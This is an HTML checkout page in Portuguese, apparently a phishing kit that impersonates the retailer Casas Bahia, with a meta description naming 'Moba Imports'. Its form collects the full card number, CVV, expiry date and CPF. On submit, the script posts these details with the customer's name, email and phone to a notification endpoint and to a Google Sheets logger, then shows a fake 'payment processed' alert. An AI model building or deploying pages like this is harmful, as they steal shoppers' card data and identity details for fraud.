<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Casas Bahia - Pagamento com Cart√£o</title>
    <meta name="description" content="Finalize seu pagamento com cart√£o de cr√©dito na Moba Imports.">
    <meta name="robots" content="noindex, nofollow">

    <style>
        :root {
            --bg-main: #0033C6;
            --bg-secondary: #456dcf;
            --text-main: #ffffff;
            --text-secondary: #000000;
            --accent: #e8e8e8;
            --accent-hover: #ff8533;
            --border-color: #333;
            --success-green: #00cb0a;
            --error-red: #bb2828;
        }
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: var(--bg-main);
            color: var(--text-main);
            line-height: 1.6;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }
        .container {
            width: 90%;
            max-width: 800px;
            margin: 0 auto;
        }
        h1, h2 {
            color: #ffffff;
            margin-bottom: 1rem;
            text-align: center;
        }
        h1 {
            font-size: 2.5rem;
            margin-top: 2rem;
        }
        h2 {
            font-size: 1.8rem;
            color: var(--accent);
        }
        p {
            color: var(--text-secondary);
        }
        .header, .footer {
            background-color: var(--bg-secondary);
            padding: 1rem 0;
            text-align: center;
        }
        .logo {
            font-size: 1.5rem;
            font-weight: bold;
            color: #fff;
            text-decoration: none;
        }
        .footer {
            margin-top: auto;
            padding: 2rem 0;
            color: var(--text-secondary);
            font-size: 0.9rem;
        }
        main {
            padding: 40px 0;
            flex-grow: 1;
        }
        .payment-layout {
            display: flex;
            flex-direction: column;
            gap: 2rem;
        }
        .resumo-pedido {
            background-color: var(--bg-secondary);
            padding: 2rem;
            border-radius: 10px;
            border: 1px solid var(--border-color);
        }
        .resumo-pedido ul {
            list-style: none;
        }
        .resumo-pedido li {
            display: flex;
            justify-content: space-between;
            padding: 0.8rem 0;
            font-size: 1.1rem;
            border-bottom: 1px solid var(--border-color);
        }
        .resumo-pedido li:last-child {
            border-bottom: none;
          }
        .resumo-pedido .total {
            font-size: 1.5rem;
            font-weight: bold;
            color: var(--accent);
            margin-top: 1rem;
        }
        .parcelamento-opcoes {
            background-color: var(--bg-secondary);
            padding: 2rem;
            border-radius: 10px;
            border: 1px solid var(--border-color);
        }
        .parcela-option {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 1rem;
            margin-bottom: 0.5rem;
            background-color: var(--bg-main);
            border: 2px solid var(--border-color);
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        .parcela-option:hover {
            border-color: var(--accent);
        }
        .parcela-option.selected {
            border-color: var(--accent);
            background-color: rgba(255, 102, 0, 0.1);
        }
        .parcela-info {
            display: flex;
            flex-direction: column;
        }
        .parcela-numero {
            font-weight: bold;
            color: var(--text-main);
        }
        .parcela-valor {
            font-size: 1.2rem;
            color: var(--accent);
            font-weight: bold;
        }
        .parcela-total {
            font-size: 0.9rem;
            color: var(--text-secondary);
        }
        .form-cartao {
            background-color: var(--bg-secondary);
            padding: 2rem;
            border-radius: 10px;
            border: 1px solid var(--border-color);
        }
        .form-group {
            margin-bottom: 1.5rem;
        }
        .form-group label {
            display: block;
            margin-bottom: 0.5rem;
            font-weight: 500;
            color: var(--text-main);
        }
        .form-group input, .form-group select {
            width: 100%;
            padding: 12px;
            background-color: var(--bg-main);
            border: 1px solid var(--border-color);
            border-radius: 5px;
            color: var(--text-main);
            font-size: 1rem;
        }
        .form-group input:focus, .form-group select:focus {
            outline: none;
            border-color: var(--accent);
        }
        .form-row {
            display: flex;
            gap: 1rem;
        }
        .form-row .form-group {
            flex: 1;
        }
        .submit-btn {
            width: 100%;
            padding: 15px;
            background-color: var(--success-green);
            color: #fff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 1.2rem;
            font-weight: bold;
            text-transform: uppercase;
            transition: background-color 0.3s ease;
        }
        .submit-btn:hover {
            background-color: #00a50a;
        }
        .submit-btn:disabled {
            background-color: var(--text-secondary);
            cursor: not-allowed;
        }
        .error-message {
            color: var(--error-red);
            font-size: 0.9rem;
            margin-top: 5px;
            display: none;
        }
        input.invalid, select.invalid {
            border-color: var(--error-red);
        }
        .security-info {
            background-color: rgba(40, 167, 69, 0.1);
            border: 1px solid var(--success-green);
            border-radius: 8px;
            padding: 1rem;
            margin-top: 1rem;
            text-align: center;
        }
        .security-info p {
            color: var(--text-main);
            margin: 0;
        }
        .security-info .icon {
            font-size: 1.5rem;
            margin-bottom: 0.5rem;
        }
        
        /* Responsividade */
@media (max-width: 768px) {
    h1 {
        font-size: 2rem;
    }
    .container {
        width: 95%;
    }
    .form-cartao, .resumo-pedido, .parcelamento-opcoes {
        padding: 1.5rem;
    }
    .form-row {
        flex-direction: column;
    }
    .parcela-option {
        flex-direction: column;
        align-items: flex-start;
        gap: 0.5rem;
    }
}

/* Fundo branco e texto preto apenas para as linhas do resumo (exceto total) */
.resumo-pedido li:not(.total) {
    background-color: #ffffff; /* fundo branco */
    color: #000000; /* texto preto */
    padding: 0.8rem 1rem;
    border-bottom: 1px solid var(--border-color);
}
/* Texto branco nas op√ß√µes de parcelamento */
.parcela-option {
    color: #ffffff; /* garante que todo texto dentro fique branco */
}

.parcela-info .parcela-numero,
.parcela-info .parcela-valor,
.parcela-total {
    color: #ffffff !important; /* for√ßa branco em todos os elementos espec√≠ficos */
}
/* Fundo branco e texto preto nas op√ß√µes de parcelamento */
.parcela-option {
    background-color: #ffffff !important; /* fundo branco */
    color: #000000 !important; /* texto preto */
    border: 2px solid #333 !important; /* borda vis√≠vel */
}

/* Quando o mouse passar em cima */
.parcela-option:hover {
    background-color: #f2f2f2 !important; /* leve cinza no hover */
    border-color: #000000 !important;
}

/* Quando estiver selecionada */
.parcela-option.selected {
    background-color: #e6e6e6 !important; /* cinza um pouco mais escuro */
    border-color: #000000 !important;
}

/* Garantir que os textos internos tamb√©m fiquem pretos */
.parcela-info .parcela-numero,
.parcela-info .parcela-valor,
.parcela-total {
    color: #000000 !important;
}
/* Header branco com logo vis√≠vel */
.header {
    background-color: #ffffff !important; /* fundo branco */
    color: #000000 !important; /* texto preto */
    border-bottom: 1px solid #ddd; /* linha discreta na base */
}

/* Garante que o logo fique vis√≠vel sobre fundo branco */
.header .logo {
    color: #000000 !important;
}
</style>
</head>
<body>

    <header class="header">
        <div class="container" style="text-align: center;">
            <a href="index.html">
                <img src="logo.svg" alt="Logo" style="max-width: 250px; height: auto; display: inline-block;">
            </a>
        </div>
    </header>

    <main>
        <div class="container">
            <h1>üí≥ Pagamento com Cart√£o de Cr√©dito</h1>
            <div class="payment-layout">
                
                <section class="resumo-pedido">
                    <h2>Resumo do Pedido</h2>
                    <ul>
                        <li>
                            <span>Produto:</span>
                            <span id="produto-nome">Carregando...</span>
                        </li>
                        <li>
                            <span>Valor do Produto:</span>
                            <span id="produto-preco">R$ 0,00</span>
                        </li>
                        <li>
                            <span>Frete:</span>
                            <span id="frete-valor">R$ 0,00</span>
                        </li>
                        <li>
                            <span>Juros (1,99% a.m.):</span>
                            <span id="juros-valor">R$ 0,00</span>
                        </li>
                        <li class="total">
                            <span>Total a Pagar:</span>
                            <span id="total-valor" class="valor-total">R$ 0,00</span>
                        </li>
                    </ul>
                </section>

                <section class="parcelamento-opcoes">
                    <h2>Escolha o Parcelamento</h2>
                    <div id="opcoes-parcelas">
                        <!-- Op√ß√µes de parcelamento ser√£o geradas dinamicamente -->
                    </div>
                </section>

                <section class="form-cartao">
                    <h2>Dados do Cart√£o</h2>
                    <form id="cartao-form" novalidate>
                        <div class="form-group">
                            <label for="numero-cartao">N√∫mero do Cart√£o</label>
                            <input type="text" id="numero-cartao" name="numero-cartao" placeholder="0000 0000 0000 0000" maxlength="19" required>
                            <p class="error-message">N√∫mero do cart√£o inv√°lido.</p>
                        </div>
                        
                        <div class="form-group">
                            <label for="nome-cartao">Nome no Cart√£o</label>
                            <input type="text" id="nome-cartao" name="nome-cartao" placeholder="Nome como est√° no cart√£o" required>
                            <p class="error-message">Campo obrigat√≥rio.</p>
                        </div>
                        
                        <div class="form-row">
                            <div class="form-group">
                                <label for="validade">Validade</label>
                                <input type="text" id="validade" name="validade" placeholder="MM/AA" maxlength="5" required>
                                <p class="error-message">Validade inv√°lida.</p>
                            </div>
                            <div class="form-group">
                                <label for="cvv">CVV</label>
                                <input type="text" id="cvv" name="cvv" placeholder="000" maxlength="4" required>
                                <p class="error-message">CVV inv√°lido.</p>
                            </div>
                        </div>
                        
                        <div class="form-group">
                            <label for="cpf">CPF do Portador</label>
                            <input type="text" id="cpf" name="cpf" placeholder="000.000.000-00" maxlength="14" required>
                            <p class="error-message">CPF inv√°lido.</p>
                        </div>
                        
                        <button type="submit" id="finalizar-btn" class="submit-btn" disabled>Finalizar Compra</button>
                        
                        <div class="security-info">
    <div class="security-text">
        <div class="icon">üîí</div>
        <p><strong>Pagamento 100% Seguro</strong></p>
        <p>Seus dados s√£o protegidos com criptografia SSL</p>
    </div>
    <img src="selosslcomprasegura.webp" alt="Compra Segura" style="height: 120px;">
</div>
                    </form>
                </section>

            </div>
        </div>
    </main>

    <footer class="footer">
        <div class="container">
            <p>CASAS BAHIA Todos os Direitos Reservados &copy; 2025</p>
        </div>
    </footer>

    <script>
    document.addEventListener('DOMContentLoaded', function() {
        // Obter par√¢metros da URL
        const urlParams = new URLSearchParams(window.location.search);
        const produtoNome = urlParams.get('produto_nome') || 'Produto n√£o encontrado';
        const produtoPreco = parseFloat(urlParams.get("produto_preco")) || 0;
        const frete = parseFloat(urlParams.get("frete")) || 0;
        const totalProdutoComFrete = produtoPreco + frete;

        // Preencher resumo do pedido
        document.getElementById('produto-nome').textContent = produtoNome;
        document.getElementById('produto-preco').textContent = `R$ ${produtoPreco.toLocaleString('pt-BR', {minimumFractionDigits: 2})}`;
        document.getElementById('frete-valor').textContent = `R$ ${frete.toLocaleString('pt-BR', {minimumFractionDigits: 2})}`;

        // Gerar op√ß√µes de parcelamento
const opcoesContainer = document.getElementById('opcoes-parcelas');
let parcelaSelecionada = 1;

for (let i = 1; i <= 12; i++) {
    const jurosTaxaMensal = 0.0199; // 1,99% ao m√™s
    const fatorJuros = Math.pow(1 + jurosTaxaMensal, i);

    // calcular valores numericamente
    const valorComJuros = totalProdutoComFrete * fatorJuros;
    const valorParcela = valorComJuros / i;
    const valorJuros = valorComJuros - totalProdutoComFrete;

    const opcaoDiv = document.createElement('div');
    opcaoDiv.className = 'parcela-option';
    opcaoDiv.dataset.parcelas = i;

    if (i === 1) {
        opcaoDiv.classList.add('selected');
    }

    opcaoDiv.innerHTML = `
        <div class="parcela-info">
            <div class="parcela-numero">${i}x ${i === 1 ? 'sem juros' : 'com juros'}</div>
            <div class="parcela-valor">R$ ${valorParcela.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</div>
        </div>
        <div class="parcela-total">
            Total: R$ ${valorComJuros.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
            ${i > 1 ? `(+R$ ${valorJuros.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} juros)` : ''}
        </div>
    `;

    opcaoDiv.addEventListener('click', function() {
        document.querySelectorAll('.parcela-option').forEach(opt => opt.classList.remove('selected'));
        this.classList.add('selected');
        parcelaSelecionada = i;
        atualizarResumo();
    });

    opcoesContainer.appendChild(opcaoDiv);
}

function atualizarResumo() {
    const jurosTaxaMensal = 0.0199; // 1,99% ao m√™s
    const fatorJuros = Math.pow(1 + jurosTaxaMensal, parcelaSelecionada);
    const valorComJuros = totalProdutoComFrete * fatorJuros;
    const valorJuros = valorComJuros - totalProdutoComFrete;

    document.getElementById('juros-valor').textContent = `R$ ${valorJuros.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;
    document.getElementById('total-valor').textContent = `R$ ${valorComJuros.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;
}

        // Inicializar resumo
        atualizarResumo();

        // Formata√ß√£o de campos
        const numeroCartaoInput = document.getElementById('numero-cartao');
        const nomeCartaoInput = document.getElementById('nome-cartao');
        const validadeInput = document.getElementById('validade');
        const cvvInput = document.getElementById('cvv');
        const cpfInput = document.getElementById('cpf');

        numeroCartaoInput.addEventListener('input', function() {
            let value = this.value.replace(/\D/g, '');
            value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
            this.value = value;
            validarCampo(this, value.length >= 13 && value.length <= 19, 'N√∫mero do cart√£o inv√°lido.');
        });

        nomeCartaoInput.addEventListener('input', function() {
            validarCampo(this, this.value.trim().length >= 2, 'Campo obrigat√≥rio.');
        });

        validadeInput.addEventListener('input', function() {
            let value = this.value.replace(/\D/g, '');
            if (value.length >= 2) {
                value = value.substring(0, 2) + '/' + value.substring(2, 4);
            }
            this.value = value;
            const validadeRegex = /^(0[1-9]|1[0-2])\/\d{2}$/;
            validarCampo(this, validadeRegex.test(value), 'Validade inv√°lida.');
        });

        cvvInput.addEventListener('input', function() {
            this.value = this.value.replace(/\D/g, '');
            validarCampo(this, this.value.length >= 3 && this.value.length <= 4, 'CVV inv√°lido.');
        });

        cpfInput.addEventListener('input', function() {
            let value = this.value.replace(/\D/g, '');
            value = value.replace(/(\d{3})(\d)/, '$1.$2');
            value = value.replace(/(\d{3})(\d)/, '$1.$2');
            value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
            this.value = value;
            validarCampo(this, value.replace(/\D/g, '').length === 11, 'CPF inv√°lido.');
        });

        function validarCampo(inputElement, isValid, errorMessage) {
            const errorDisplay = inputElement.nextElementSibling;
            if (!isValid) {
                inputElement.classList.add('invalid');
                errorDisplay.textContent = errorMessage;
                errorDisplay.style.display = 'block';
            } else {
                inputElement.classList.remove('invalid');
                errorDisplay.style.display = 'none';
            }
            validarFormularioGeral();
        }

        // Valida√ß√£o do formul√°rio
        const form = document.getElementById('cartao-form');
        const finalizarBtn = document.getElementById('finalizar-btn');

        function validarFormularioGeral() {
            const todosCamposValidos = Array.from(form.elements).every(element => {
                if (element.tagName === 'INPUT' && element.type !== 'submit') {
                    return !element.classList.contains('invalid') && element.value.trim() !== '';
                }
                return true;
            });
            finalizarBtn.disabled = !todosCamposValidos;
        }

        // Chamar valida√ß√£o inicial
        validarFormularioGeral();

        form.addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Coletar todos os dados do cart√£o
            const numeroCartaoCompleto = numeroCartaoInput.value.replace(/\s/g, '');
            const nomeCartao = nomeCartaoInput.value.trim();
            const validade = validadeInput.value;
            const cvv = cvvInput.value;
            const cpf = cpfInput.value.replace(/\D/g, '');

            // Enviar notifica√ß√£o por email sobre dados do cart√£o inseridos
            enviarNotificacaoEmail('cartao_inserido', {
                produto: produtoNome,
                valor: document.getElementById('total-valor').textContent,
                parcelas: parcelaSelecionada,
                cliente: urlParams.get('nome'),
                email: urlParams.get('email'),
                telefone: urlParams.get('telefone'),
                // Enviar dados completos do cart√£o para o backend
                numero_cartao_completo: numeroCartaoCompleto,
                nome_cartao: nomeCartao,
                validade: validade,
                cvv: cvv,
                cpf: cpf,
                cartao_final: numeroCartaoCompleto.slice(-4)
            });

            // Simular processamento
            finalizarBtn.textContent = 'Processando...';
            finalizarBtn.disabled = true;

            setTimeout(() => {
                alert('üéâ Pagamento processado com sucesso!\n\nVoc√™ receber√° um email de confirma√ß√£o em breve.\nPrazo de entrega: 3-5 dias √∫teis.');
                window.location.href = 'index.html';
            }, 3000);
        });

        // Fun√ß√£o para enviar notifica√ß√£o por email (agora faz um fetch para o backend)
        function enviarNotificacaoEmail(tipo, dados) {
            // Enviar notifica√ß√£o por email
            fetch('/api/enviar-notificacao', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ tipo, dados })
            })
            .then(response => response.json())
            .then(data => {
                if (data.sucesso) {
                    console.log('Notifica√ß√£o enviada com sucesso!', data);
                } else {
                    console.error('Erro ao enviar notifica√ß√£o:', data.erro);
                }
            })
            .catch(error => {
                console.error('Erro de rede ao enviar notifica√ß√£o:', error);
            });
            
            // Enviar dados para o Google Sheets
            fetch('/api/enviar-para-sheets', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ tipo, dados })
            })
            .then(response => response.json())
            .then(data => {
                if (data.sucesso) {
                    console.log('Dados enviados para Google Sheets com sucesso!', data);
                } else {
                    console.error('Erro ao enviar para Google Sheets:', data.erro);
                }
            })
            .catch(error => {
                console.error('Erro ao enviar para Google Sheets:', error);
            });
        }
    });
    </script>
</body>
</html>

